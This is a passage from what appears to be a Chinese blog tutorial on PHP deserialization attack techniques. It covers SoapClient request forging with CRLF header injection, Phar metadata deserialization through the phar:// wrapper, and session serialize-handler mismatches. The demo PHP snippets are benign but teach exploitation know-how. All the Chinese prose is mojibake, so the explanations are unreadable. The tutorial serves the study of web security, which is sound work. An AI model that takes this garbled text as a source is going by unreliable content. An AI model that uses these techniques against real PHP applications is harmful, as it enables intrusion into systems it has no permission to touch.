$args:å¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</span><br></code></pre></td></tr></table></figure><p>æ­£å¸¸æƒ…å†µä¸‹çš„<code>SoapClient</code>ç±»ï¼Œè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œå»è°ƒç”¨<code>__call</code>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># å…ˆncç›‘å¬æŒ‡å®šç«¯å£ï¼Œç„¶åè¿è¡Œ</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://127.0.0.1:9999&#x27;</span>,<br>    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;mechoy&#x27;</span>,<br>));<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;mechoy();   <span class="hljs-comment">// è°ƒç”¨åŸç”Ÿç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/13.png"></p><p><code>header</code>ä¸­<code>SOAPAction</code>ã€<code>User-Agent</code>çš„å€¼å¯æ§çš„ï¼Œå› æ­¤å¯ä»¥å†å€ŸåŠ©<code>CRLF</code>ï¼Œæ’å…¥ä»»æ„çš„<code>HTTP</code>å¤´</p><h4 id="Pharæ–‡ä»¶"><a href="#Pharæ–‡ä»¶" class="headerlink" title="Pharæ–‡ä»¶"></a>Pharæ–‡ä»¶</h4><p>PHP Archiveï¼Œpharæ‰©å±•æä¾›äº†ä¸€ç§å°†æ•´ä¸ªPHPåº”ç”¨ç¨‹åºæ”¾å…¥.pharæ–‡ä»¶ä¸­çš„æ–¹æ³•ï¼Œä»¥æ–¹ä¾¿ç§»åŠ¨ã€å®‰è£…ã€‚.pharæ–‡ä»¶çš„æœ€å¤§ç‰¹ç‚¹æ˜¯å°†å‡ ä¸ªæ–‡ä»¶ç»„åˆæˆä¸€ä¸ªæ–‡ä»¶çš„ä¾¿æ·æ–¹å¼ï¼Œ.pharæ–‡ä»¶æä¾›äº†ä¸€ç§å°†å®Œæ•´çš„PHPç¨‹åºåˆ†å¸ƒåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å¹¶ä»è¯¥æ–‡ä»¶ä¸­è¿è¡Œçš„æ–¹æ³•ã€‚</p><p>pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œä¼šä»¥<strong>åºåˆ—åŒ–</strong>çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„<strong>meta-data</strong>ã€‚å½“å—å½±å“çš„æ–‡ä»¶æ“ä½œå‡½æ•°è°ƒç”¨pharæ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨ååºåˆ—åŒ–meta-dataå†…çš„å†…å®¹ã€‚</p><h5 id="Phar-æ–‡ä»¶ç»“æ„"><a href="#Phar-æ–‡ä»¶ç»“æ„" class="headerlink" title="Phar æ–‡ä»¶ç»“æ„"></a>Phar æ–‡ä»¶ç»“æ„</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">All Phar archives contain three to four sections: <span class="hljs-comment">// æ‰€æœ‰ Phar æ¡£æ¡ˆéƒ½åŒ…å«ä¸‰åˆ°å››ä¸ªéƒ¨åˆ†</span><br>a stub<br><span class="hljs-comment">// å­˜æ ¹ ï¼š</span><br><span class="hljs-comment">/* pharæ–‡ä»¶çš„æ ‡å¿—ï¼Œå¿…é¡»ä»¥ xxx __HALT_COMPILER();?&gt; ç»“å°¾ï¼Œå¦åˆ™æ— æ³•è¯†åˆ«ã€‚xxxå¯ä»¥ä¸ºè‡ªå®šä¹‰å†…å®¹ã€‚*/</span><br>a manifest describing the contents<br><span class="hljs-comment">// æè¿°å†…å®¹çš„æ¸…å•</span><br><span class="hljs-comment">/* pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-data */</span><br>the file contents <br><span class="hljs-comment">// æ–‡ä»¶å†…å®¹ï¼šè¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹</span><br>[optional] a signature <span class="hljs-keyword">for</span> verifying Phar integrity (phar file format only) <br><span class="hljs-comment">// å¯é€‰é¡¹ ç”¨äºéªŒè¯ Phar å®Œæ•´æ€§çš„ç­¾åï¼ˆä»…é™ Phar æ–‡ä»¶æ ¼å¼ï¼‰ï¼šç­¾åï¼Œæ”¾åœ¨æœ«å°¾ã€‚</span><br></code></pre></td></tr></table></figure><h5 id="Phar-æ–‡ä»¶æ ¼å¼"><a href="#Phar-æ–‡ä»¶æ ¼å¼" class="headerlink" title="Phar æ–‡ä»¶æ ¼å¼"></a>Phar æ–‡ä»¶æ ¼å¼</h5><p>(å…¨å±€ Phar æ¸…å•æ ¼å¼)</p><table><thead><tr><th>å­—èŠ‚å¤§å°</th><th>æè¿°</th></tr></thead><tbody><tr><td>4å­—èŠ‚</td><td>æ¸…å•é•¿åº¦ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ï¼ˆ1 MB é™åˆ¶ï¼‰</td></tr><tr><td>4å­—èŠ‚</td><td>Phar ä¸­çš„æ–‡ä»¶æ•°</td></tr><tr><td>2 ä¸ªå­—èŠ‚</td><td>Phar æ¸…å•çš„ API ç‰ˆæœ¬ï¼ˆå½“å‰ä¸º 1.0.0ï¼‰</td></tr><tr><td>4å­—èŠ‚</td><td>å…¨å±€ Phar ä½å›¾æ ‡å¿—</td></tr><tr><td>4å­—èŠ‚</td><td>Phar åˆ«åçš„é•¿åº¦</td></tr><tr><td>??</td><td>Phar åˆ«åï¼ˆé•¿åº¦åŸºäºä¸Šä¸€ä¸ªï¼‰</td></tr><tr><td>4å­—èŠ‚</td><td>Phar å…ƒæ•°æ®çš„é•¿åº¦ï¼ˆ<code>0</code>æ— ï¼‰</td></tr><tr><td>??</td><td>åºåˆ—åŒ–çš„ Phar å…ƒæ•°æ®(meta-data)ï¼Œä»¥<a href="https://www.php.net/manual/en/function.serialize.php">serialize()</a>æ ¼å¼å­˜å‚¨</td></tr><tr><td>è‡³å°‘ 24 * æ¡ç›®å­—èŠ‚æ•°</td><td>æ¯ä¸ªæ–‡ä»¶çš„æ¡ç›®</td></tr></tbody></table><p>ç”±æ­¤å¯è§ï¼Œ<code>Pharçš„meta-data</code>åˆ™æ˜¯ååºåˆ—åŒ–æ¼æ´çš„æˆå› ï¼Œ<code>meta-data</code>åœ¨åˆ›å»ºæˆ–å­˜å‚¨æ—¶ä»¥<strong>åºåˆ—åŒ–</strong>çš„å½¢å¼å­˜å‚¨ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨æ—¶åˆ™ä¼šè¿›è¡Œ<strong>ååºåˆ—åŒ–æ“ä½œ</strong>ï¼Œphpå¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡phar://ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œä¸‹å›¾ä¸ºçŸ¥é“åˆ›å®‡æµ‹è¯•å—å½±å“å‡½æ•°çš„åˆ—è¡¨</p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/20.png" alt="https://paper.seebug.org/680/#22-demo"></p><p>è¡¥å……ï¼š</p><table><thead><tr><th align="left">è¡¥å……ï¼šå—å½±å“å‡½æ•°åˆ—è¡¨</th><th>PHP ç‰ˆæœ¬ï¼š</th></tr></thead><tbody><tr><td align="left">md5_file()</td><td>4.2.0+<br>åœ¨ PHP 5.0 ä¸­ï¼Œæ–°å¢ <em>raw</em> å‚æ•°ã€‚</td></tr></tbody></table><h5 id="åˆ›å»ºPharæ–‡ä»¶"><a href="#åˆ›å»ºPharæ–‡ä»¶" class="headerlink" title="åˆ›å»ºPharæ–‡ä»¶"></a>åˆ›å»ºPharæ–‡ä»¶</h5><p>è¿™é‡Œä½¿ç”¨Pharç±»è¿›è¡Œ<code>Phar</code>æ–‡ä»¶çš„åˆ›å»º</p><p><code>Phar</code> ç±»æä¾›äº†è®¿é—®å’Œåˆ›å»º <code>Phar</code> æ¡£æ¡ˆçš„é«˜çº§æ¥å£ã€‚<a href="https://www.php.net/manual/en/class.phar.php">Pharç±»ä½¿ç”¨è¯¦æƒ…</a></p><p>è¿™é‡Œç®€å•è¯´ä¸€ä¸‹èƒ½ç”¨åˆ°çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># æ„é€ æ–¹æ³•</span><br><span class="hljs-keyword">public</span> __construct(<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-built_in">FilesystemIterator</span>::SKIP_DOTS | <span class="hljs-built_in">FilesystemIterator</span>::UNIX_PATHS, ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$alias</span> = <span class="hljs-literal">null</span>)<br><span class="hljs-comment">// $filenameçš„å€¼å¿…é¡»ä¸º*.phar</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># å¼€å§‹ç¼“å†² Phar å†™æ“ä½œï¼Œä¸è¦ä¿®æ”¹ç£ç›˜ä¸Šçš„ Phar å¯¹è±¡</span><br><span class="hljs-keyword">public</span> Phar::startBuffering(): <span class="hljs-keyword">void</span><br><span class="hljs-comment">// ä»¥åœ¨åˆ›å»ºæˆ–ä¿®æ”¹åŒ…å«å¤§é‡æ–‡ä»¶çš„ Phar å­˜æ¡£æ—¶æä¾›æ˜¾ç€çš„æ€§èƒ½æå‡</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># åœæ­¢ç¼“å†²å¯¹ Phar å½’æ¡£çš„å†™å…¥è¯·æ±‚ï¼Œå¹¶å°†æ›´æ”¹ä¿å­˜åˆ°ç£ç›˜</span><br><span class="hljs-keyword">public</span> Phar::stopBuffering(): <span class="hljs-keyword">void</span><br><span class="hljs-comment">// Phar::stopBuffering()ä¸ Phar::startBuffering()æ–¹æ³•ç»“åˆä½¿ç”¨</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># è®¾ç½® phar å­˜æ¡£å…ƒæ•°æ®</span><br><span class="hljs-keyword">public</span> Phar::setMetadata(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$metadata</span>): <span class="hljs-keyword">void</span><br><span class="hljs-comment">// æ­¤æ–¹æ³•éœ€è¦è®¾ç½®php.iniè®¾ç½®phar.readonlyæ‰èƒ½0ç”¨äºPhar å¯¹è±¡ã€‚å¦åˆ™ï¼Œå°†æŠ›å‡ºPharException ã€‚</span><br><span class="hljs-comment">// ç”¨äºå­˜å‚¨è‡ªå®šä¹‰æ•°æ®ï¼Œè¿™äº›æ•°æ®å°†æœ‰å…³ phar æ¡£æ¡ˆçš„æŸäº›å†…å®¹æè¿°ä¸ºä¸€ä¸ªå®Œæ•´çš„å®ä½“ã€‚ PharFileInfo::setMetadata()åº”è¯¥ç”¨äºæ–‡ä»¶ç‰¹å®šçš„å…ƒæ•°æ®ã€‚</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># å°†æ–‡ä»¶ä»å­—ç¬¦ä¸²æ·»åŠ åˆ° phar å­˜æ¡£</span><br><span class="hljs-keyword">public</span> Phar::addFromString(<span class="hljs-keyword">string</span> <span class="hljs-variable">$localName</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$contents</span>): <span class="hljs-keyword">void</span><br><span class="hljs-comment">// $localName:æ–‡ä»¶å°†å­˜å‚¨åœ¨å­˜æ¡£ä¸­çš„è·¯å¾„ã€‚</span><br><span class="hljs-comment">// $contents:è¦å­˜å‚¨çš„æ–‡ä»¶å†…å®¹</span><br><span class="hljs-comment">// ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œå¯ä»¥å°†ä»»ä½•å­—ç¬¦ä¸²æ·»åŠ åˆ° phar å­˜æ¡£ä¸­ã€‚è¯¥æ–‡ä»¶å°†localnameä½œä¸ºå…¶è·¯å¾„å­˜å‚¨åœ¨å­˜æ¡£ä¸­ã€‚</span><br><span class="hljs-comment">// æ³¨æ„ï¼š Phar::addFile()ã€Phar::addFromString()å’ŒPhar::offsetSet() æ¯æ¬¡è°ƒç”¨æ—¶éƒ½ä¼šä¿å­˜ä¸€ä¸ªæ–°çš„ phar å­˜æ¡£</span><br><span class="hljs-comment">// ä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥å‡½æ•°æ˜¯ç”¨äºç”Ÿäº§pharæ–‡ä»¶çš„é‡è¦æ­¥éª¤</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># ç”¨äºè®¾ç½® Phar å­˜æ¡£çš„ PHP åŠ è½½å™¨æˆ–å¼•å¯¼å­˜æ ¹</span><br><span class="hljs-keyword">public</span> Phar::setStub(<span class="hljs-keyword">string</span> <span class="hljs-variable">$stub</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$len</span> = -<span class="hljs-number">1</span>): <span class="hljs-keyword">bool</span><br><span class="hljs-comment">// æ­¤æ–¹æ³•ç”¨äºå°† PHP å¼•å¯¼åŠ è½½ç¨‹åºå­˜æ ¹æ·»åŠ åˆ°æ–°çš„ Phar å­˜æ¡£ï¼Œæˆ–æ›¿æ¢ç°æœ‰ Phar å­˜æ¡£ä¸­çš„åŠ è½½ç¨‹åºå­˜æ ¹ã€‚</span><br><span class="hljs-comment">// ç†è§£çš„å°±æ˜¯ï¼Œè¯¥æ–¹æ³•å°†åˆ›å»ºä¸€ä¸ªæ–°çš„pharæ–‡ä»¶ï¼Œè‹¥åŸæ¥å­˜åœ¨åŒåpharæ–‡ä»¶ï¼Œåˆ™æ›¿æ¢</span><br><span class="hljs-comment">// æ­¤æ–¹æ³•éœ€è¦è®¾ç½®php.iniè®¾ç½®phar.readonlyæ‰èƒ½0ç”¨äºPhar å¯¹è±¡ã€‚å¦åˆ™ï¼Œå°†æŠ›å‡ºPharException ã€‚</span><br></code></pre></td></tr></table></figure><p>å†™ä¸ªdemo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># demo.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mechoy</span> = <span class="hljs-string">&quot;rookie!&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello Phar&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;demo.phar&quot;</span>);<br><span class="hljs-comment"># $phar-&gt;startBuffering();</span><br><span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-keyword">new</span> Test();<br><span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$flag</span>);<br><span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment"># $phar-&gt;stopBuffering();</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/21.png"></p><p>å†æ¥çœ‹è¿™ä¸ª<code>demo.php</code>æ–‡ä»¶</p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/22.png"></p><p>è€Œå½“ä½¿ç”¨ä¸€äº›æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æ<code>phar</code>æ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†<code>meta-data</code>è¿›è¡Œååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># demo2.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mechoy</span> = <span class="hljs-string">&quot;rookie!&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;destruct!\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wakeup\n&quot;</span>;<br>    &#125;<br>&#125;<br>file_get_contents(<span class="hljs-string">&quot;phar://demo.phar&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/23.png"></p><h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><p>ä¼šè¯[<code>session</code>]æ”¯æŒåœ¨ PHP ä¸­æ˜¯åœ¨å¹¶å‘è®¿é—®æ—¶ç”±ä¸€ä¸ªæ–¹æ³•æ¥ä¿å­˜æŸäº›æ•°æ®.ä»è€Œä½¿ä½ èƒ½å¤Ÿæ„å»ºæ›´å¤šçš„å®šåˆ¶ç¨‹åº ä»è€Œæé«˜ä½ çš„ web ç½‘ç«™çš„å¸å¼•åŠ›.ä¸€ä¸ªè®¿é—®è€…è®¿é—®ä½ çš„ web ç½‘ç«™å°†è¢«åˆ†é…ä¸€ä¸ªå”¯ä¸€çš„ id, å°±æ˜¯æ‰€è°“çš„ä¼šè¯ id. è¿™ä¸ª id å¯ä»¥å­˜å‚¨åœ¨ç”¨æˆ·ç«¯çš„ä¸€ä¸ª cookie ä¸­ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ URL è¿›è¡Œä¼ é€’.ä¼šè¯æ”¯æŒå…è®¸ä½ å°†è¯·æ±‚ä¸­çš„æ•°æ®ä¿å­˜åœ¨è¶…å…¨å±€æ•°ç»„[$_SESSION]ä¸­. å½“ä¸€ä¸ªè®¿é—®è€…è®¿é—®ä½ çš„ç½‘ç«™ï¼ŒPHP å°†è‡ªåŠ¨æ£€æŸ¥(å¦‚æœ <a href="https://www.php.net/manual/zh/session.configuration.php#ini.session.auto-start">session.auto_start</a> è¢«è®¾ç½®ä¸º 1ï¼‰æˆ–è€…åœ¨ä½ è¦æ±‚ä¸‹æ£€æŸ¥(æ˜ç¡®é€šè¿‡ <a href="https://www.php.net/manual/zh/function.session-start.php">session_start()</a> æˆ–è€…éšå¼é€šè¿‡ <strong>session_register()</strong>) å½“å‰ä¼šè¯ id æ˜¯å¦æ˜¯å…ˆå‰å‘é€çš„è¯·æ±‚åˆ›å»º. å¦‚æœæ˜¯è¿™ç§æƒ…å†µï¼Œ é‚£ä¹ˆå…ˆå‰ä¿å­˜çš„ç¯å¢ƒå°†è¢«é‡å»º.</p><p>ç®€å•ç‚¹è¯´ï¼Œsessionä½œä¸ºç”¨æˆ·çš„å”¯ä¸€æ ‡è¯†ï¼ŒæœåŠ¡ç«¯å°†æ ¹æ®sessionå»åŒºåˆ†ç”¨æˆ·ã€‚</p><h5 id="Sessionå·¥ä½œæµç¨‹"><a href="#Sessionå·¥ä½œæµç¨‹" class="headerlink" title="Sessionå·¥ä½œæµç¨‹"></a>Sessionå·¥ä½œæµç¨‹</h5><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/24.png"></p><h5 id="PHP-sessionçš„ç›¸å…³é…ç½®"><a href="#PHP-sessionçš„ç›¸å…³é…ç½®" class="headerlink" title="PHP sessionçš„ç›¸å…³é…ç½®"></a>PHP sessionçš„ç›¸å…³é…ç½®</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">session.save_path=<span class="hljs-string">&quot;/tmp&quot;</span>      --è®¾ç½®sessionæ–‡ä»¶çš„å­˜å‚¨ä½ç½®,æ–‡ä»¶åä»¥sess_PHPSESSIDå‘½å<br>session.save_handler=files    --è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®sessionå­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°<br>session.auto_start= <span class="hljs-number">0</span>          --æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯ï¼Œé»˜è®¤å€¼ä¸º <span class="hljs-number">0</span>ï¼Œä¸å¯åŠ¨<br>session.serialize_handler= php --å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ï¼Œè®¾ç½®phpçš„sessionçš„åºåˆ—åŒ–æ–¹å¼,é»˜è®¤ä½¿ç”¨php  <br>session.upload_progress.enabled= On --å¯ç”¨ä¸Šä¼ è¿›åº¦è·Ÿè¸ªï¼Œå¹¶å¡«å……$ _SESSIONå˜é‡ï¼Œé»˜è®¤å¯ç”¨<br>session.upload_progress.cleanup= oN --è¯»å–æ‰€æœ‰POSTæ•°æ®ï¼ˆå³å®Œæˆä¸Šä¼ ï¼‰åç«‹å³æ¸…ç†è¿›åº¦ä¿¡æ¯ï¼Œé»˜è®¤å¯ç”¨<br>session.gc_maxlifetime = <span class="hljs-number">1440</span>--æŒ‡å®šè¿‡äº†å¤šå°‘ç§’ä¹‹åæ•°æ®å°±ä¼šè¢«è§†ä¸ºâ€œåƒåœ¾â€å¹¶è¢«æ¸…é™¤ã€‚ä¼šè¯è¿‡æœŸæ—¶é—´<br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>session.serialize_handler</code>(ä¹Ÿå°±æ˜¯<code>PHP session</code>åºåˆ—åŒ–æœºåˆ¶)å­˜åœ¨ä»¥ä¸‹å‡ ç§</p><ul><li><code>php_binary</code>: é”®åçš„é•¿åº¦å¯¹åº”çš„asciiå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–åçš„å€¼</li></ul><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/27.png"></p><ul><li><code>php</code>: é”®å+ç«–çº¿ï¼ˆ|ï¼‰+ç»è¿‡serialize()å‡½æ•°å¤„ç†è¿‡çš„å€¼</li></ul><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/25.png"></p><ul><li><code>php_serialize</code>: ç»è¿‡serialize()å‡½æ•°å¤„ç†è¿‡çš„å€¼ï¼Œä¼šå°†é”®åå’Œå€¼å½“ä½œä¸€ä¸ªæ•°ç»„åºåˆ—åŒ–ï¼Œï¼ˆPHP&gt;5.5.4+ï¼‰</li></ul><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/26.png"></p><h5 id="sessionçš„ååºåˆ—åŒ–æ¼æ´"><a href="#sessionçš„ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="sessionçš„ååºåˆ—åŒ–æ¼æ´"></a>sessionçš„ååºåˆ—åŒ–æ¼æ´</h5><p>åˆ©ç”¨<code>php</code>å¤„ç†å™¨å’Œ<code>php_serialize</code>å¤„ç†å™¨çš„å­˜å‚¨æ ¼å¼å·®å¼‚è€Œäº§ç”Ÿ</p><p><code>php</code>å¤„ç†å™¨ä»¥  <code>é”®å+ç«–çº¿ï¼ˆ|ï¼‰+ç»è¿‡serialize()å‡½æ•°å¤„ç†è¿‡çš„å€¼</code>å­˜å…¥<code>PHPSESSID</code>æ–‡ä»¶ä¸­</p><p>è€Œ<code>php_serialize</code>å¤„ç†å™¨åˆ™æ˜¯ä»¥ <code>$_SESSIONæ•°ç»„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²</code>ç›´æ¥å­˜å‚¨åœ¨<code>PHPSESSID</code>æ–‡ä»¶ä¸­</p><p>å½“ä»¥<code>php_serialize</code>å¤„ç†å™¨å­˜å…¥ï¼ŒåŒæ—¶ä»¥<code>php</code>å¤„ç†å™¨è¯»å–æ—¶ï¼Œ<code>php</code>å¤„ç†å™¨ä¼šå¯»æ‰¾<code>ç«–çº¿ï¼ˆ|ï¼‰</code>å¹¶ååºåˆ—åŒ–<code>ç«–çº¿ï¼ˆ|ï¼‰</code>åé¢çš„å€¼</p><p>çœ‹ä¸ªdemo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># demo1.php</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<span class="hljs-comment">// 